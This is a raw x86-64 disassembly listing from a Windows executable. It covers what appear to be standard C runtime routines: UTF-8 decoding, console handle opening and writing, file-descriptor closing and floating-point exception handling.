   14000cb94:	48 83 21 00          	andq   $0x0,(%rcx)
   14000cb98:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000cb9c:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000cba0:	c7 42 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rdx)
   14000cba7:	c3                   	ret
   14000cba8:	40 53                	rex push %rbx
   14000cbaa:	55                   	push   %rbp
   14000cbab:	56                   	push   %rsi
   14000cbac:	57                   	push   %rdi
   14000cbad:	41 54                	push   %r12
   14000cbaf:	41 56                	push   %r14
   14000cbb1:	41 57                	push   %r15
   14000cbb3:	48 83 ec 40          	sub    $0x40,%rsp
   14000cbb7:	48 8b 05 82 c4 00 00 	mov    0xc482(%rip),%rax        # 0x140019040
   14000cbbe:	48 33 c4             	xor    %rsp,%rax
   14000cbc1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000cbc6:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   14000cbcd:	00 
   14000cbce:	4c 8d 15 0b dc 00 00 	lea    0xdc0b(%rip),%r10        # 0x14001a7e0
   14000cbd5:	45 33 db             	xor    %r11d,%r11d
   14000cbd8:	48 8d 3d 73 2f 00 00 	lea    0x2f73(%rip),%rdi        # 0x14000fb52
   14000cbdf:	4d 85 c9             	test   %r9,%r9
   14000cbe2:	48 8b c2             	mov    %rdx,%rax
   14000cbe5:	4c 8b e2             	mov    %rdx,%r12
   14000cbe8:	4d 0f 45 d1          	cmovne %r9,%r10
   14000cbec:	48 85 d2             	test   %rdx,%rdx
   14000cbef:	41 8d 6b 01          	lea    0x1(%r11),%ebp
   14000cbf3:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000cbf7:	44 8b fd             	mov    %ebp,%r15d
   14000cbfa:	4d 0f 45 f8          	cmovne %r8,%r15
   14000cbfe:	48 f7 d8             	neg    %rax
   14000cc01:	4d 1b f6             	sbb    %r14,%r14
   14000cc04:	4c 23 f1             	and    %rcx,%r14
   14000cc07:	4d 85 ff             	test   %r15,%r15
   14000cc0a:	75 0c                	jne    0x14000cc18
   14000cc0c:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000cc13:	e9 4d 01 00 00       	jmp    0x14000cd65
   14000cc18:	66 45 39 5a 06       	cmp    %r11w,0x6(%r10)
   14000cc1d:	75 68                	jne    0x14000cc87
   14000cc1f:	44 0f b6 0f          	movzbl (%rdi),%r9d
   14000cc23:	48 ff c7             	inc    %rdi
   14000cc26:	45 84 c9             	test   %r9b,%r9b
   14000cc29:	78 17                	js     0x14000cc42
   14000cc2b:	4d 85 f6             	test   %r14,%r14
   14000cc2e:	74 03                	je     0x14000cc33
   14000cc30:	45 89 0e             	mov    %r9d,(%r14)
   14000cc33:	45 84 c9             	test   %r9b,%r9b
   14000cc36:	41 0f 95 c3          	setne  %r11b
   14000cc3a:	49 8b c3             	mov    %r11,%rax
   14000cc3d:	e9 23 01 00 00       	jmp    0x14000cd65
   14000cc42:	41 8a c1             	mov    %r9b,%al
   14000cc45:	24 e0                	and    $0xe0,%al
   14000cc47:	3c c0                	cmp    $0xc0,%al
   14000cc49:	75 05                	jne    0x14000cc50
   14000cc4b:	41 b0 02             	mov    $0x2,%r8b
   14000cc4e:	eb 1e                	jmp    0x14000cc6e
   14000cc50:	41 8a c1             	mov    %r9b,%al
   14000cc53:	24 f0                	and    $0xf0,%al
   14000cc55:	3c e0                	cmp    $0xe0,%al
   14000cc57:	75 05                	jne    0x14000cc5e
   14000cc59:	41 b0 03             	mov    $0x3,%r8b
   14000cc5c:	eb 10                	jmp    0x14000cc6e
   14000cc5e:	41 8a c1             	mov    %r9b,%al
   14000cc61:	24 f8                	and    $0xf8,%al
   14000cc63:	3c f0                	cmp    $0xf0,%al
   14000cc65:	0f 85 ef 00 00 00    	jne    0x14000cd5a
   14000cc6b:	41 b0 04             	mov    $0x4,%r8b
   14000cc6e:	41 0f b6 c0          	movzbl %r8b,%eax
   14000cc72:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000cc77:	2b c8                	sub    %eax,%ecx
   14000cc79:	8b d5                	mov    %ebp,%edx
   14000cc7b:	d3 e2                	shl    %cl,%edx
   14000cc7d:	41 8a d8             	mov    %r8b,%bl
   14000cc80:	2b d5                	sub    %ebp,%edx
   14000cc82:	41 23 d1             	and    %r9d,%edx
   14000cc85:	eb 29                	jmp    0x14000ccb0
   14000cc87:	45 8a 42 04          	mov    0x4(%r10),%r8b
   14000cc8b:	41 8b 12             	mov    (%r10),%edx
   14000cc8e:	41 8a 5a 06          	mov    0x6(%r10),%bl
   14000cc92:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000cc96:	3c 02                	cmp    $0x2,%al
   14000cc98:	0f 87 bc 00 00 00    	ja     0x14000cd5a
   14000cc9e:	40 3a dd             	cmp    %bpl,%bl
   14000cca1:	0f 82 b3 00 00 00    	jb     0x14000cd5a
   14000cca7:	41 3a d8             	cmp    %r8b,%bl
   14000ccaa:	0f 83 aa 00 00 00    	jae    0x14000cd5a
   14000ccb0:	0f b6 eb             	movzbl %bl,%ebp
   14000ccb3:	49 3b ef             	cmp    %r15,%rbp
   14000ccb6:	44 8b cd             	mov    %ebp,%r9d
   14000ccb9:	4d 0f 43 cf          	cmovae %r15,%r9
   14000ccbd:	eb 1e                	jmp    0x14000ccdd
   14000ccbf:	0f b6 0f             	movzbl (%rdi),%ecx
   14000ccc2:	48 ff c7             	inc    %rdi
   14000ccc5:	8a c1                	mov    %cl,%al
   14000ccc7:	24 c0                	and    $0xc0,%al
   14000ccc9:	3c 80                	cmp    $0x80,%al
   14000cccb:	0f 85 89 00 00 00    	jne    0x14000cd5a
   14000ccd1:	8b c2                	mov    %edx,%eax
   14000ccd3:	83 e1 3f             	and    $0x3f,%ecx
   14000ccd6:	c1 e0 06             	shl    $0x6,%eax
   14000ccd9:	8b d1                	mov    %ecx,%edx
   14000ccdb:	0b d0                	or     %eax,%edx
   14000ccdd:	48 8b c7             	mov    %rdi,%rax
   14000cce0:	49 2b c4             	sub    %r12,%rax
   14000cce3:	49 3b c1             	cmp    %r9,%rax
   14000cce6:	72 d7                	jb     0x14000ccbf
   14000cce8:	4c 3b cd             	cmp    %rbp,%r9
   14000cceb:	73 1c                	jae    0x14000cd09
   14000cced:	41 0f b6 c0          	movzbl %r8b,%eax
   14000ccf1:	41 2a d9             	sub    %r9b,%bl
   14000ccf4:	66 41 89 42 04       	mov    %ax,0x4(%r10)
   14000ccf9:	0f b6 c3             	movzbl %bl,%eax
   14000ccfc:	66 41 89 42 06       	mov    %ax,0x6(%r10)
   14000cd01:	41 89 12             	mov    %edx,(%r10)
   14000cd04:	e9 03 ff ff ff       	jmp    0x14000cc0c
   14000cd09:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000cd0f:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000cd14:	76 44                	jbe    0x14000cd5a
   14000cd16:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000cd1c:	73 3c                	jae    0x14000cd5a
   14000cd1e:	41 0f b6 c0          	movzbl %r8b,%eax
   14000cd22:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000cd29:	00 
   14000cd2a:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000cd31:	00 
   14000cd32:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000cd39:	00 
   14000cd3a:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000cd3e:	72 1a                	jb     0x14000cd5a
   14000cd40:	4d 85 f6             	test   %r14,%r14
   14000cd43:	74 03                	je     0x14000cd48
   14000cd45:	41 89 16             	mov    %edx,(%r14)
   14000cd48:	f7 da                	neg    %edx
   14000cd4a:	49 8b d2             	mov    %r10,%rdx
   14000cd4d:	48 1b c9             	sbb    %rcx,%rcx
   14000cd50:	48 23 cd             	and    %rbp,%rcx
   14000cd53:	e8 34 fe ff ff       	call   0x14000cb8c
   14000cd58:	eb 0b                	jmp    0x14000cd65
   14000cd5a:	48 8b d6             	mov    %rsi,%rdx
   14000cd5d:	49 8b ca             	mov    %r10,%rcx
   14000cd60:	e8 2f fe ff ff       	call   0x14000cb94
   14000cd65:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000cd6a:	48 33 cc             	xor    %rsp,%rcx
   14000cd6d:	e8 1e 0d 00 00       	call   0x14000da90
   14000cd72:	48 83 c4 40          	add    $0x40,%rsp
   14000cd76:	41 5f                	pop    %r15
   14000cd78:	41 5e                	pop    %r14
   14000cd7a:	41 5c                	pop    %r12
   14000cd7c:	5f                   	pop    %rdi
   14000cd7d:	5e                   	pop    %rsi
   14000cd7e:	5d                   	pop    %rbp
   14000cd7f:	5b                   	pop    %rbx
   14000cd80:	c3                   	ret
   14000cd81:	cc                   	int3
   14000cd82:	cc                   	int3
   14000cd83:	cc                   	int3
   14000cd84:	40 53                	rex push %rbx
   14000cd86:	48 83 ec 40          	sub    $0x40,%rsp
   14000cd8a:	48 8b 05 9f cc 00 00 	mov    0xcc9f(%rip),%rax        # 0x140019a30
   14000cd91:	33 db                	xor    %ebx,%ebx
   14000cd93:	48 83 f8 fe          	cmp    $0xfffffffffffffffe,%rax
   14000cd97:	75 2e                	jne    0x14000cdc7
   14000cd99:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000cd9e:	44 8d 43 03          	lea    0x3(%rbx),%r8d
   14000cda2:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000cda6:	48 8d 0d a3 81 00 00 	lea    0x81a3(%rip),%rcx        # 0x140014f50
   14000cdad:	45 33 c9             	xor    %r9d,%r9d
   14000cdb0:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000cdb5:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000cdba:	ff 15 70 24 00 00    	call   *0x2470(%rip)        # 0x14000f230
   14000cdc0:	48 89 05 69 cc 00 00 	mov    %rax,0xcc69(%rip)        # 0x140019a30
   14000cdc7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000cdcb:	0f 95 c3             	setne  %bl
   14000cdce:	8b c3                	mov    %ebx,%eax
   14000cdd0:	48 83 c4 40          	add    $0x40,%rsp
   14000cdd4:	5b                   	pop    %rbx
   14000cdd5:	c3                   	ret
   14000cdd6:	cc                   	int3
   14000cdd7:	cc                   	int3
   14000cdd8:	48 83 ec 28          	sub    $0x28,%rsp
   14000cddc:	48 8b 0d 4d cc 00 00 	mov    0xcc4d(%rip),%rcx        # 0x140019a30
   14000cde3:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000cde7:	77 06                	ja     0x14000cdef
   14000cde9:	ff 15 91 22 00 00    	call   *0x2291(%rip)        # 0x14000f080
   14000cdef:	48 83 c4 28          	add    $0x28,%rsp
   14000cdf3:	c3                   	ret
   14000cdf4:	48 8b c4             	mov    %rsp,%rax
   14000cdf7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000cdfb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000cdff:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000ce03:	57                   	push   %rdi
   14000ce04:	48 83 ec 40          	sub    $0x40,%rsp
   14000ce08:	48 83 60 d8 00       	andq   $0x0,-0x28(%rax)
   14000ce0d:	49 8b f8             	mov    %r8,%rdi
   14000ce10:	4d 8b c8             	mov    %r8,%r9
   14000ce13:	8b f2                	mov    %edx,%esi
   14000ce15:	44 8b c2             	mov    %edx,%r8d
   14000ce18:	48 8b e9             	mov    %rcx,%rbp
   14000ce1b:	48 8b d1             	mov    %rcx,%rdx
   14000ce1e:	48 8b 0d 0b cc 00 00 	mov    0xcc0b(%rip),%rcx        # 0x140019a30
   14000ce25:	ff 15 dd 21 00 00    	call   *0x21dd(%rip)        # 0x14000f008
   14000ce2b:	8b d8                	mov    %eax,%ebx
   14000ce2d:	85 c0                	test   %eax,%eax
   14000ce2f:	75 6a                	jne    0x14000ce9b
   14000ce31:	ff 15 59 22 00 00    	call   *0x2259(%rip)        # 0x14000f090
   14000ce37:	83 f8 06             	cmp    $0x6,%eax
   14000ce3a:	75 5f                	jne    0x14000ce9b
   14000ce3c:	48 8b 0d ed cb 00 00 	mov    0xcbed(%rip),%rcx        # 0x140019a30
   14000ce43:	48 83 f9 fd          	cmp    $0xfffffffffffffffd,%rcx
   14000ce47:	77 06                	ja     0x14000ce4f
   14000ce49:	ff 15 31 22 00 00    	call   *0x2231(%rip)        # 0x14000f080
   14000ce4f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000ce55:	48 8d 0d f4 80 00 00 	lea    0x80f4(%rip),%rcx        # 0x140014f50
   14000ce5c:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000ce61:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000ce67:	45 33 c9             	xor    %r9d,%r9d
   14000ce6a:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   14000ce6f:	ba 00 00 00 40       	mov    $0x40000000,%edx
   14000ce74:	ff 15 b6 23 00 00    	call   *0x23b6(%rip)        # 0x14000f230
   14000ce7a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000ce80:	4c 8b cf             	mov    %rdi,%r9
   14000ce83:	48 8b c8             	mov    %rax,%rcx
   14000ce86:	48 89 05 a3 cb 00 00 	mov    %rax,0xcba3(%rip)        # 0x140019a30
   14000ce8d:	44 8b c6             	mov    %esi,%r8d
   14000ce90:	48 8b d5             	mov    %rbp,%rdx
   14000ce93:	ff 15 6f 21 00 00    	call   *0x216f(%rip)        # 0x14000f008
   14000ce99:	8b d8                	mov    %eax,%ebx
   14000ce9b:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000cea0:	8b c3                	mov    %ebx,%eax
   14000cea2:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000cea7:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000ceac:	48 83 c4 40          	add    $0x40,%rsp
   14000ceb0:	5f                   	pop    %rdi
   14000ceb1:	c3                   	ret
   14000ceb2:	cc                   	int3
   14000ceb3:	cc                   	int3
   14000ceb4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ceb9:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000cebe:	57                   	push   %rdi
   14000cebf:	48 83 ec 20          	sub    $0x20,%rsp
   14000cec3:	49 8b f9             	mov    %r9,%rdi
   14000cec6:	49 8b d8             	mov    %r8,%rbx
   14000cec9:	8b 0a                	mov    (%rdx),%ecx
   14000cecb:	e8 24 bc ff ff       	call   0x140008af4
   14000ced0:	90                   	nop
   14000ced1:	48 8b 03             	mov    (%rbx),%rax
   14000ced4:	48 63 08             	movslq (%rax),%rcx
   14000ced7:	4c 8b d1             	mov    %rcx,%r10
   14000ceda:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000cede:	48 8b c1             	mov    %rcx,%rax
   14000cee1:	48 c1 f8 06          	sar    $0x6,%rax
   14000cee5:	4c 8d 0d f4 d2 00 00 	lea    0xd2f4(%rip),%r9        # 0x14001a1e0
   14000ceec:	41 83 e2 3f          	and    $0x3f,%r10d
   14000cef0:	4f 8d 04 d2          	lea    (%r10,%r10,8),%r8
   14000cef4:	49 8b 04 c1          	mov    (%r9,%rax,8),%rax
   14000cef8:	42 f6 44 c0 38 01    	testb  $0x1,0x38(%rax,%r8,8)
   14000cefe:	74 09                	je     0x14000cf09
   14000cf00:	e8 eb 00 00 00       	call   0x14000cff0
   14000cf05:	8b d8                	mov    %eax,%ebx
   14000cf07:	eb 0e                	jmp    0x14000cf17
   14000cf09:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000cf0d:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000cf14:	83 cb ff             	or     $0xffffffff,%ebx
   14000cf17:	8b 0f                	mov    (%rdi),%ecx
   14000cf19:	e8 fe bb ff ff       	call   0x140008b1c
   14000cf1e:	8b c3                	mov    %ebx,%eax
   14000cf20:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000cf25:	48 83 c4 20          	add    $0x20,%rsp
   14000cf29:	5f                   	pop    %rdi
   14000cf2a:	c3                   	ret
   14000cf2b:	cc                   	int3
   14000cf2c:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000cf30:	48 83 ec 58          	sub    $0x58,%rsp
   14000cf34:	4c 63 c1             	movslq %ecx,%r8
   14000cf37:	45 33 c9             	xor    %r9d,%r9d
   14000cf3a:	41 83 f8 fe          	cmp    $0xfffffffe,%r8d
   14000cf3e:	75 18                	jne    0x14000cf58
   14000cf40:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000cf44:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000cf48:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000cf4c:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000cf53:	e9 8d 00 00 00       	jmp    0x14000cfe5
   14000cf58:	85 c9                	test   %ecx,%ecx
   14000cf5a:	78 60                	js     0x14000cfbc
   14000cf5c:	44 3b 05 7d d6 00 00 	cmp    0xd67d(%rip),%r8d        # 0x14001a5e0
   14000cf63:	73 57                	jae    0x14000cfbc
   14000cf65:	49 8b c8             	mov    %r8,%rcx
   14000cf68:	4c 8d 15 71 d2 00 00 	lea    0xd271(%rip),%r10        # 0x14001a1e0
   14000cf6f:	83 e1 3f             	and    $0x3f,%ecx
   14000cf72:	49 8b c0             	mov    %r8,%rax
   14000cf75:	48 c1 f8 06          	sar    $0x6,%rax
   14000cf79:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000cf7d:	49 8b 04 c2          	mov    (%r10,%rax,8),%rax
   14000cf81:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   14000cf86:	74 34                	je     0x14000cfbc
   14000cf88:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000cf8d:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   14000cf92:	44 89 44 24 78       	mov    %r8d,0x78(%rsp)
   14000cf97:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000cf9c:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   14000cfa1:	4c 8d 4c 24 78       	lea    0x78(%rsp),%r9
   14000cfa6:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000cfab:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000cfb0:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000cfb5:	e8 fa fe ff ff       	call   0x14000ceb4
   14000cfba:	eb 2c                	jmp    0x14000cfe8
   14000cfbc:	c6 42 38 01          	movb   $0x1,0x38(%rdx)
   14000cfc0:	45 33 c0             	xor    %r8d,%r8d
   14000cfc3:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000cfc7:	33 c9                	xor    %ecx,%ecx
   14000cfc9:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000cfcd:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000cfd2:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000cfd9:	33 d2                	xor    %edx,%edx
   14000cfdb:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000cfe0:	e8 47 a1 ff ff       	call   0x14000712c
   14000cfe5:	83 c8 ff             	or     $0xffffffff,%eax
   14000cfe8:	48 83 c4 58          	add    $0x58,%rsp
   14000cfec:	c3                   	ret
   14000cfed:	cc                   	int3
   14000cfee:	cc                   	int3
   14000cfef:	cc                   	int3
   14000cff0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000cff5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000cffa:	57                   	push   %rdi
   14000cffb:	48 83 ec 20          	sub    $0x20,%rsp
   14000cfff:	48 63 f9             	movslq %ecx,%rdi
   14000d002:	48 8b f2             	mov    %rdx,%rsi
   14000d005:	8b cf                	mov    %edi,%ecx
   14000d007:	e8 f4 bb ff ff       	call   0x140008c00
   14000d00c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000d010:	75 04                	jne    0x14000d016
   14000d012:	33 db                	xor    %ebx,%ebx
   14000d014:	eb 5a                	jmp    0x14000d070
   14000d016:	48 8b 05 c3 d1 00 00 	mov    0xd1c3(%rip),%rax        # 0x14001a1e0
   14000d01d:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000d022:	83 ff 01             	cmp    $0x1,%edi
   14000d025:	75 09                	jne    0x14000d030
   14000d027:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000d02e:	75 0d                	jne    0x14000d03d
   14000d030:	3b f9                	cmp    %ecx,%edi
   14000d032:	75 20                	jne    0x14000d054
   14000d034:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000d03b:	74 17                	je     0x14000d054
   14000d03d:	e8 be bb ff ff       	call   0x140008c00
   14000d042:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000d047:	48 8b d8             	mov    %rax,%rbx
   14000d04a:	e8 b1 bb ff ff       	call   0x140008c00
   14000d04f:	48 3b c3             	cmp    %rbx,%rax
   14000d052:	74 be                	je     0x14000d012
   14000d054:	8b cf                	mov    %edi,%ecx
   14000d056:	e8 a5 bb ff ff       	call   0x140008c00
   14000d05b:	48 8b c8             	mov    %rax,%rcx
   14000d05e:	ff 15 1c 20 00 00    	call   *0x201c(%rip)        # 0x14000f080
   14000d064:	85 c0                	test   %eax,%eax
   14000d066:	75 aa                	jne    0x14000d012
   14000d068:	ff 15 22 20 00 00    	call   *0x2022(%rip)        # 0x14000f090
   14000d06e:	8b d8                	mov    %eax,%ebx
   14000d070:	8b cf                	mov    %edi,%ecx
   14000d072:	e8 cd ba ff ff       	call   0x140008b44
   14000d077:	48 8b d7             	mov    %rdi,%rdx
   14000d07a:	4c 8d 05 5f d1 00 00 	lea    0xd15f(%rip),%r8        # 0x14001a1e0
   14000d081:	83 e2 3f             	and    $0x3f,%edx
   14000d084:	48 8b cf             	mov    %rdi,%rcx
   14000d087:	48 c1 f9 06          	sar    $0x6,%rcx
   14000d08b:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000d08f:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000d093:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000d098:	85 db                	test   %ebx,%ebx
   14000d09a:	74 0f                	je     0x14000d0ab
   14000d09c:	48 8b d6             	mov    %rsi,%rdx
   14000d09f:	8b cb                	mov    %ebx,%ecx
   14000d0a1:	e8 6a a3 ff ff       	call   0x140007410
   14000d0a6:	83 c8 ff             	or     $0xffffffff,%eax
   14000d0a9:	eb 02                	jmp    0x14000d0ad
   14000d0ab:	33 c0                	xor    %eax,%eax
   14000d0ad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d0b2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000d0b7:	48 83 c4 20          	add    $0x20,%rsp
   14000d0bb:	5f                   	pop    %rdi
   14000d0bc:	c3                   	ret
   14000d0bd:	cc                   	int3
   14000d0be:	cc                   	int3
   14000d0bf:	cc                   	int3
   14000d0c0:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000d0c4:	33 c0                	xor    %eax,%eax
   14000d0c6:	48 89 01             	mov    %rax,(%rcx)
   14000d0c9:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000d0cd:	89 41 10             	mov    %eax,0x10(%rcx)
   14000d0d0:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000d0d4:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000d0d8:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000d0db:	c3                   	ret
   14000d0dc:	48 8b c4             	mov    %rsp,%rax
   14000d0df:	53                   	push   %rbx
   14000d0e0:	48 83 ec 50          	sub    $0x50,%rsp
   14000d0e4:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
   14000d0eb:	00 00 
   14000d0ed:	8b d9                	mov    %ecx,%ebx
   14000d0ef:	f2 0f 10 8c 24 88 00 	movsd  0x88(%rsp),%xmm1
   14000d0f6:	00 00 
   14000d0f8:	ba c0 ff 00 00       	mov    $0xffc0,%edx
   14000d0fd:	89 48 c8             	mov    %ecx,-0x38(%rax)
   14000d100:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000d107:	00 
   14000d108:	f2 0f 11 40 e0       	movsd  %xmm0,-0x20(%rax)
   14000d10d:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000d112:	f2 0f 11 58 d8       	movsd  %xmm3,-0x28(%rax)
   14000d117:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   14000d11b:	e8 28 07 00 00       	call   0x14000d848
   14000d120:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000d125:	e8 62 82 ff ff       	call   0x14000538c
   14000d12a:	85 c0                	test   %eax,%eax
   14000d12c:	75 07                	jne    0x14000d135
   14000d12e:	8b cb                	mov    %ebx,%ecx
   14000d130:	e8 c3 06 00 00       	call   0x14000d7f8
   14000d135:	f2 0f 10 44 24 40    	movsd  0x40(%rsp),%xmm0
   14000d13b:	48 83 c4 50          	add    $0x50,%rsp
   14000d13f:	5b                   	pop    %rbx
   14000d140:	c3                   	ret
   14000d141:	cc                   	int3
   14000d142:	cc                   	int3
   14000d143:	cc                   	int3
   14000d144:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000d149:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000d14e:	57                   	push   %rdi
   14000d14f:	48 83 ec 20          	sub    $0x20,%rsp
   14000d153:	8b d9                	mov    %ecx,%ebx
   14000d155:	48 8b f2             	mov    %rdx,%rsi
   14000d158:	83 e3 1f             	and    $0x1f,%ebx
   14000d15b:	8b f9                	mov    %ecx,%edi
   14000d15d:	f6 c1 08             	test   $0x8,%cl
   14000d160:	74 14                	je     0x14000d176
   14000d162:	40 84 f6             	test   %sil,%sil
   14000d165:	79 0f                	jns    0x14000d176
   14000d167:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000d16c:	e8 53 07 00 00       	call   0x14000d8c4
   14000d171:	83 e3 f7             	and    $0xfffffff7,%ebx
   14000d174:	eb 57                	jmp    0x14000d1cd
   14000d176:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000d17b:	40 84 f9             	test   %dil,%cl
   14000d17e:	74 11                	je     0x14000d191
   14000d180:	48 0f ba e6 09       	bt     $0x9,%rsi
   14000d185:	73 0a                	jae    0x14000d191
   14000d187:	e8 38 07 00 00       	call   0x14000d8c4
   14000d18c:	83 e3 fb             	and    $0xfffffffb,%ebx
   14000d18f:	eb 3c                	jmp    0x14000d1cd
   14000d191:	40 f6 c7 01          	test   $0x1,%dil
   14000d195:	74 16                	je     0x14000d1ad
   14000d197:	48 0f ba e6 0a       	bt     $0xa,%rsi
   14000d19c:	73 0f                	jae    0x14000d1ad
   14000d19e:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000d1a3:	e8 1c 07 00 00       	call   0x14000d8c4
   14000d1a8:	83 e3 fe             	and    $0xfffffffe,%ebx
   14000d1ab:	eb 20                	jmp    0x14000d1cd
   14000d1ad:	40 f6 c7 02          	test   $0x2,%dil
   14000d1b1:	74 1a                	je     0x14000d1cd
   14000d1b3:	48 0f ba e6 0b       	bt     $0xb,%rsi
   14000d1b8:	73 13                	jae    0x14000d1cd
   14000d1ba:	40 f6 c7 10          	test   $0x10,%dil
   14000d1be:	74 0a                	je     0x14000d1ca
   14000d1c0:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000d1c5:	e8 fa 06 00 00       	call   0x14000d8c4
   14000d1ca:	83 e3 fd             	and    $0xfffffffd,%ebx
   14000d1cd:	40 f6 c7 10          	test   $0x10,%dil
   14000d1d1:	74 14                	je     0x14000d1e7
   14000d1d3:	48 0f ba e6 0c       	bt     $0xc,%rsi
   14000d1d8:	73 0d                	jae    0x14000d1e7
   14000d1da:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000d1df:	e8 e0 06 00 00       	call   0x14000d8c4
   14000d1e4:	83 e3 ef             	and    $0xffffffef,%ebx
   14000d1e7:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000d1ec:	33 c0                	xor    %eax,%eax
   14000d1ee:	85 db                	test   %ebx,%ebx
   14000d1f0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000d1f5:	0f 94 c0             	sete   %al
   14000d1f8:	48 83 c4 20          	add    $0x20,%rsp
   14000d1fc:	5f                   	pop    %rdi
   14000d1fd:	c3                   	ret
   14000d1fe:	cc                   	int3
   14000d1ff:	cc                   	int3
   14000d200:	48 8b c4             	mov    %rsp,%rax
   14000d203:	55                   	push   %rbp
   14000d204:	53                   	push   %rbx
   14000d205:	56                   	push   %rsi
   14000d206:	57                   	push   %rdi
   14000d207:	41 56                	push   %r14
   14000d209:	48 8d 68 c9          	lea    -0x37(%rax),%rbp
   14000d20d:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000d214:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   14000d218:	48 8b 05 21 be 00 00 	mov    0xbe21(%rip),%rax        # 0x140019040
   14000d21f:	48 33 c4             	xor    %rsp,%rax
   14000d222:	48 89 45 ef          	mov    %rax,-0x11(%rbp)
   14000d226:	8b f2                	mov    %edx,%esi
   14000d228:	4c 8b f1             	mov    %rcx,%r14
